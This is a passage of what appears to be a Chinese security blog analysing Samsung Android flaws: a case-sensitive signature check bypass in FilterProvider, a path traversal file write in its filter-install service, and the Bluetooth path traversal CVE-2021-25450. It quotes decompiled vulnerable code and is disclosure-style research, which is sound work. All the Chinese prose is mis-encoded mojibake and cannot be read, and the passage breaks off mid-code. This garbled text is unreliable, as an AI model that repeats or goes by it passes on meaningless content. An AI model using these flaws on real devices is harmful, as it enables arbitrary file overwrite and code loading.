<p><code>tex</code>å’Œ<code>so</code>æ–‡ä»¶å°†è¢«æå–ï¼Œä½†æ˜¯ï¼Œå¯¹äº<code>so</code>æ–‡ä»¶ï¼Œ<code>FilterProvider</code>å°†å¯¹åŒ…æœ‰ä¸€äº›æ£€æŸ¥ã€‚ä¸€ä¸ª<code>.sig</code>ç­¾åæ–‡ä»¶å¿…é¡»ä¼´éšç€é¢„å…ˆåˆ›å»ºçš„RSAå…¬é’¥å¹¶ç»è¿‡éªŒè¯ï¼Œå¦åˆ™ï¼Œ<code>Content Provider</code>å°†æ‹’ç»å°†å…¶æ’å…¥åˆ°<code>content://com.samsung.android.provider.filterprovider/filters</code>è¡¨ä¸­ã€‚å¼€å‘è€…çš„ç›®çš„åº”è¯¥æ˜¯ï¼Œè¿™æ ·çš„æ–‡ä»¶æ˜¯ç”±ä¸‰æ˜Ÿçš„ç§é’¥ç­¾åå¹¶é€šè¿‡å…¬é’¥éªŒè¯ï¼Œè¿™æ ·è¯¥åŒ…å°±å¯ä»¥åœ¨ç›¸æœºåº”ç”¨å•†åº—åˆ†å‘ã€‚ä½†æ˜¯ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼š**æ ¡éªŒè¿‡ç¨‹åªé’ˆå¯¹<code>so</code>ï¼Œè€Œæ²¡æœ‰åŒ…å«<code>SO</code>**ã€‚è¿™æ ·ï¼Œå½“ä¸‹ä¸€æ¬¡ç›¸æœºåº”ç”¨ç¨‹åºè¢«æ‰“å¼€æ—¶ï¼Œå¹¶ç‚¹å‡»ç›¸åº”çš„å›¾æ ‡åï¼Œæ‰€æœ‰çš„è¿‡æ»¤å™¨å°†è¢«é¢„è£…åˆ°ç›¸æœºè¿›ç¨‹ç©ºé—´ä¸­ï¼Œç›¸åº”çš„ä»£ç åœ¨<code>libcamera_effect_processor_jni.so</code>ä¸­ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_13A3A4</span><span class="params">(__int64 a1, <span class="type">char</span> *a2, <span class="type">char</span> *s1)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	v28 = <span class="number">0LL</span>;</span><br><span class="line">	ptr[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">	<span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;com.samsung.android.provider.filterprovider&quot;</span>) &amp;&amp; *(_DWORD *)(a1 + <span class="number">36</span>) != <span class="number">2</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		asprintf(ptr, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;/data/DownFilters/Lib64/&quot;</span>, a2);</span><br><span class="line">		v7 = <span class="string">&quot;/data/DownFilters/Tex/&quot;</span>;</span><br><span class="line">		LABEL_11:</span><br><span class="line">		ptr[<span class="number">1</span>] = v7;</span><br><span class="line">		<span class="keyword">goto</span> LABEL_12;</span><br><span class="line">	&#125;</span><br><span class="line">	v5 = *(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">	<span class="keyword">if</span> ( v5 )</span><br><span class="line">	&#123;</span><br><span class="line">		v6 = sub_57490(v5, a2);</span><br><span class="line">		<span class="keyword">if</span> ( v6 )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> ( v6 != <span class="number">400</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> ( (sub_57748(*(_QWORD *)(a1 + <span class="number">16</span>), (<span class="type">int</span>)ptr, a2) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">					sub_575C4(*(_QWORD *)(a1 + <span class="number">16</span>), (<span class="type">int</span>)&amp;v28, a2);</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					asprintf(ptr, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;/system/lib64/&quot;</span>, a2);</span><br><span class="line">					v7 = <span class="string">&quot;/system/cameradata/preloadfilters/Tex/&quot;</span>;</span><br><span class="line">					<span class="keyword">goto</span> LABEL_11;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	LABEL_12:</span><br><span class="line">	__android_log_print(<span class="number">3</span>, <span class="string">&quot;SECIMAGING&quot;</span>, <span class="string">&quot;Try to open external effect (%s)&quot;</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">	*(_QWORD *)(a1 + <span class="number">56</span>) = dlopen(ptr[<span class="number">0</span>], <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">free</span>(ptr[<span class="number">0</span>]);</span><br><span class="line">	v8 = *(<span class="type">void</span> **)(a1 + <span class="number">56</span>);</span><br><span class="line">	<span class="keyword">if</span> ( !v8 )</span><br><span class="line">	&#123;</span><br><span class="line">		v19 = dlerror();</span><br><span class="line">		__android_log_print(<span class="number">6</span>, <span class="string">&quot;SECIMAGING&quot;</span>, <span class="string">&quot;Filter %s dlopen failed&quot;</span>, v19);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	v9 = (__int64 (*)(<span class="type">void</span>))dlsym(v8, <span class="string">&quot;Create&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>èµ‹äºˆç›¸æœºåº”ç”¨ç¨‹åº<code>WRITE_EFFECT_FILTER</code>æƒé™ä»¥åï¼Œ<code>FilterProvider</code>çš„æœåŠ¡<code>MyFilterService</code>å°†èƒ½å¤Ÿæ¥æ”¶<code>Intent</code>ï¼Œå¹¶å°†å…¶å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.android.provider.filterprovider;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">install</span><span class="params">(Bundle arg15)</span> &#123;</span><br><span class="line">	Log.d(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;install&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(arg15 == <span class="literal">null</span>) &#123;</span><br><span class="line">		Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;install : bundle is null, return.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">this</span>.createMyFilterDirectory();</span><br><span class="line">	<span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> arg15.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">	<span class="type">String</span> <span class="variable">v4</span> <span class="operator">=</span> arg15.getString(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">	<span class="type">byte</span>[] v6 = arg15.getByteArray(<span class="string">&quot;filter_thumbnail&quot;</span>);</span><br><span class="line">	<span class="type">String</span> <span class="variable">v7</span> <span class="operator">=</span> v2 + <span class="string">&quot;.bmp&quot;</span>;</span><br><span class="line">	<span class="type">String</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="built_in">this</span>.copySelFileFromIntent(MyFilterInstaller.FILTER_STORAGE_MY_FILTER + <span class="string">&quot;/&quot;</span> + v4, arg15);</span><br><span class="line">	<span class="keyword">if</span>(v8 == <span class="literal">null</span>) &#123;</span><br><span class="line">		Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;install : sel file copy failed = &quot;</span> + v4 + <span class="string">&quot; return.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//.. /data/xxx/ + &quot;../../../../../&quot;</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">copySelFileFromIntent</span><span class="params">(String arg9, Bundle arg10)</span> &#123;</span><br><span class="line">	<span class="type">byte</span>[] v9_1;</span><br><span class="line">	FileOutputStream v10;</span><br><span class="line">	File v5;</span><br><span class="line">	<span class="type">int</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		v5 = <span class="keyword">new</span> <span class="title class_">File</span>(arg9);</span><br><span class="line">		<span class="keyword">goto</span> label_13;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(Exception unused_ex) &#123;</span><br><span class="line">		v10 = <span class="literal">null</span>;</span><br><span class="line">		v5 = <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">goto</span> label_43;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			label_13:</span><br><span class="line">			<span class="keyword">if</span>(v5.exists()) &#123;</span><br><span class="line">				v5.delete();</span><br><span class="line">				Log.w(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;The named file already exists : &quot;</span> + arg9 + <span class="string">&quot;. So remove file.&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			v5.createNewFile();</span><br><span class="line">			v9_1 = arg10.getByteArray(<span class="string">&quot;filter_data&quot;</span>);</span><br><span class="line">			v10 = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(v5);</span><br><span class="line">			<span class="keyword">goto</span> label_33;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(Exception unused_ex) &#123;</span><br><span class="line">			v10 = <span class="literal">null</span>;</span><br><span class="line">			<span class="keyword">goto</span> label_43;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				label_33:</span><br><span class="line">				v10.write(v9_1);</span><br><span class="line">				<span class="keyword">if</span>(!v5.setExecutable(<span class="literal">true</span>, <span class="literal">false</span>)) &#123;</span><br><span class="line">					Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;filter.setExecutable when copy from asset is not complete properly&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(!v5.setReadable(<span class="literal">true</span>, <span class="literal">false</span>)) &#123;</span><br><span class="line">					Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;filter.setReadable when copy from asset is not complete properly&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span>(Exception unused_ex) &#123;</span><br><span class="line">				label_43:</span><br><span class="line">				Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;copySelFileFromIntent : Exception is occurred.&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span>(v10 != <span class="literal">null</span>) &#123;</span><br><span class="line">					<span class="keyword">try</span> &#123;</span><br><span class="line">						v10.close();</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">catch</span>(IOException unused_ex) &#123;</span><br><span class="line">						Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;copySelFileFromIntent : Exception is occurred.&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			v10.close();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(IOException unused_ex) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;copySelFileFromIntent : Exception is occurred.&quot;</span>);</span><br><span class="line">			<span class="keyword">goto</span> label_62;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæœåŠ¡è¢«ç­¾åæƒé™æ‰€ä¿æŠ¤ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.MyFilterService&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:permission</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.permission.WRITE_FILTER&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.INSERT_MYFILTER&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.INSERT_MYFILTER_LIST&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.DELETE_MYFILTER&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ‰äº†è¿™ä¸ªbugï¼Œå°±å¯ä»¥åˆ©ç”¨ä¹‹å‰çš„bugæ¥è°ƒç”¨æœåŠ¡ï¼Œå¾—åˆ°ä¸€ä¸ªç›´æ¥çš„æ–‡ä»¶å†™å…¥ï¼Œè¦†ç›–ä»»ä½•æ–‡ä»¶ã€‚</p>
<h2 id="3-2-Samsung-FactoryAirCommandManagerè·¯å¾„ç©¿è¶Š"><a href="#3-2-Samsung-FactoryAirCommandManagerè·¯å¾„ç©¿è¶Š" class="headerlink" title="3.2 Samsung FactoryAirCommandManagerè·¯å¾„ç©¿è¶Š"></a>3.2 Samsung FactoryAirCommandManagerè·¯å¾„ç©¿è¶Š</h2><p>æ¼æ´ç¼–å·ä¸ºCVE-2021-25450ï¼Œå¹¶åœ¨2021å¹´9æœˆçš„ä¸‰æ˜Ÿå®‰å…¨å…¬å‘Šä¸­å¾—åˆ°ä¿®å¤ã€‚</p>
<p>æ¼æ´åœ¨<code>BluetoothSocketModule</code>æ¨¡å—ä¸­ï¼Œå®ƒæœ‰ä¸¤ä¸ªå­ç±»<code>BluetoothClient</code> å’Œ <code>BluetoothServer</code>ã€‚è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡è“ç‰™<code>socket</code>å‘é€æ–‡ä»¶åˆ°ä»»æ„è·¯å¾„ï¼Œæœ€ä¸»è¦çš„æ˜¯è“ç‰™çš„è¿æ¥ä¸éœ€è¦ç”¨æˆ·åŒæ„ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startSocket</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">    <span class="type">byte</span>[] newBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;startSocket&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.readSocket = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="built_in">this</span>.is, Charset.forName(<span class="string">&quot;UTF-8&quot;</span>)));</span><br><span class="line">    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;readSocket&quot;</span>, <span class="string">&quot;readSocket: &quot;</span> + <span class="built_in">this</span>.readSocket);</span><br><span class="line">    <span class="built_in">this</span>.isRunning = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> <span class="built_in">this</span>.is.read(buffer);</span><br><span class="line">            <span class="keyword">if</span> (read == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (AirCommandManager.getInstance().getModeTo() == <span class="number">10</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.isMetaMode = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.isMetaMode = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.isContinue) &#123;</span><br><span class="line">                <span class="built_in">this</span>.startTime = System.currentTimeMillis();</span><br><span class="line">                <span class="built_in">this</span>.isContinue = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;Receive &quot;</span> + read + <span class="string">&quot; bytes: &quot;</span> + Support.Functions.byteArrayToHexString(buffer, read));</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isFileMode) &#123;</span><br><span class="line">                <span class="built_in">this</span>.getFileSize += read;</span><br><span class="line">                ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;getFileSize: &quot;</span> + <span class="built_in">this</span>.getFileSize);</span><br><span class="line">                ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;file mode&quot;</span>);</span><br><span class="line">                <span class="built_in">this</span>.fos.write(buffer, <span class="number">0</span>, read);</span><br><span class="line">                <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.getFileSize &gt;= <span class="built_in">this</span>.fileLength) &#123;</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;end file mode&quot;</span>);</span><br><span class="line">                    <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">2</span>);</span><br><span class="line">                    <span class="built_in">this</span>.isFileMode = <span class="literal">false</span>;</span><br><span class="line">                    <span class="built_in">this</span>.fos.close();</span><br><span class="line">                    <span class="built_in">this</span>.getFileSize = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.isMetaMode) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Support.Functions.byteArrayToHexString(buffer, read);</span><br><span class="line">                <span class="built_in">this</span>.mBluetoothBypassModule.sendDataFromSendModule(str, <span class="literal">false</span>);</span><br><span class="line">                ACUtil.sendMessage(context, str);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.arraycopy(buffer, <span class="number">0</span>, newBuffer, maxLength, read);</span><br><span class="line">                maxLength += read;</span><br><span class="line">                <span class="keyword">if</span> (newBuffer[maxLength - <span class="number">1</span>] == <span class="number">126</span>) &#123;</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;DIAG byte&quot;</span>);</span><br><span class="line">                    <span class="type">byte</span>[] fullBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[maxLength];</span><br><span class="line">                    System.arraycopy(newBuffer, <span class="number">0</span>, fullBuffer, <span class="number">0</span>, maxLength);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> Support.Functions.byteArrayToHexString(fullBuffer);</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;DIAG str: &quot;</span> + str2);</span><br><span class="line">                    <span class="built_in">this</span>.mBluetoothBypassModule.sendDataFromSendModule(str2, <span class="literal">false</span>);</span><br><span class="line">                    ACUtil.sendMessage(context, str2);</span><br><span class="line">                    maxLength = <span class="number">0</span>;</span><br><span class="line">                    Arrays.fill(newBuffer, (<span class="type">byte</span>) <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (maxLength &gt; <span class="number">1</span> &amp;&amp; newBuffer[maxLength - <span class="number">2</span>] == <span class="number">13</span> &amp;&amp; newBuffer[maxLength - <span class="number">1</span>] == <span class="number">10</span>) &#123;</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;string&quot;</span>);</span><br><span class="line">                    <span class="type">byte</span>[] fullBuffer2 = <span class="keyword">new</span> <span class="title class_">byte</span>[maxLength];</span><br><span class="line">                    System.arraycopy(newBuffer, <span class="number">0</span>, fullBuffer2, <span class="number">0</span>, maxLength);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(fullBuffer2, <span class="number">0</span>, maxLength, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (str3.toUpperCase().contains(<span class="string">&quot;AT+FACMFILE&quot;</span>)) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.isFileMode = <span class="literal">true</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">subStr</span> <span class="operator">=</span> str3.substring(str3.indexOf(<span class="string">&quot;=&quot;</span>) + <span class="number">1</span>, str3.length() - <span class="number">2</span>);</span><br><span class="line">                        <span class="built_in">this</span>.fileName = subStr.split(<span class="string">&quot;,&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                        <span class="built_in">this</span>.fileLength = Integer.parseInt(subStr.split(<span class="string">&quot;,&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;name: &quot;</span> + <span class="built_in">this</span>.fileName + <span class="string">&quot; length: &quot;</span> + <span class="built_in">this</span>.fileLength);</span><br><span class="line">                        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(savePath);</span><br><span class="line">                        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                            file.mkdirs();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">file2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(savePath + <span class="built_in">this</span>.fileName);</span><br><span class="line">                        ACUtil.log_d(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;Save: &quot;</span> + file2.getPath());</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.fileLength != <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="built_in">this</span>.fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file2);</span><br><span class="line">                            <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        maxLength = <span class="number">0</span>;</span><br><span class="line">                        Arrays.fill(newBuffer, (<span class="type">byte</span>) <span class="number">0</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;end string&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> str3 + <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">                        ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;str: &quot;</span> + str4);</span><br><span class="line">                        <span class="built_in">this</span>.mBluetoothBypassModule.sendDataFromSendModule(str4, <span class="literal">false</span>);</span><br><span class="line">                        maxLength = <span class="number">0</span>;</span><br><span class="line">                        Arrays.fill(newBuffer, (<span class="type">byte</span>) <span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            BluetoothService.mHandler.sendEmptyMessageDelayed(<span class="number">1000</span>, <span class="number">3000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">this</span>.isFileMode = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.fos != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.fos.close();</span><br><span 